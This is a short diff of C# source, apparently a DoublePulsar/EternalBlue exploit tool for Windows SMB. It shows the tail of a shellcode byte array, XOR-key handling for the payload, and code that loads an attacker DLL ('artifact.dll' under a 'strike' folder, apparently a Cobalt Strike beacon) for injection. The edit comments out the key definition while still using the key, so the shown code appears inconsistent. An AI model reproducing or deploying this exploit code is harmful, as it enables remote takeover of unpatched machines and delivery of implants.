@@ -5,6 +5,7 @@ using System.Net;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.IO;
 
 /* Sources used: 
 https://github.com/povlteksttv/Eternalblue/blob/master/Eternalblue/Program.cs
@@ -954,10 +955,11 @@ namespace DoublePulsar
             0xF3, 0xAA, 0x58, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5E, 0x5F, 0x5D, 0x5B, 0xC3, 0xEB, 0x08, 0x00, 0x14, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00
             };
 
-        UInt32 SolidXORKey = 0xa3684f15;
-        byte[] ByteXORKEY = INT2LE(SolidXORKey);
+        //UInt32 Key = 0x58581162;
+        byte[] ByteXORKEY = INT2LE(Key);
 
-        byte[] array = File.ReadAllBytes("D:\\strike\\64\\artifact.dll");
+        //Your DLL file here
+        byte[] array = File.ReadAllBytes("D:\\strike\\artifact.dll");
         //System.Console.WriteLine(HexDump(array));
         System.Console.WriteLine("File imported into memory!");
         System.Console.WriteLine("Size of file:  {0}", array.Length);
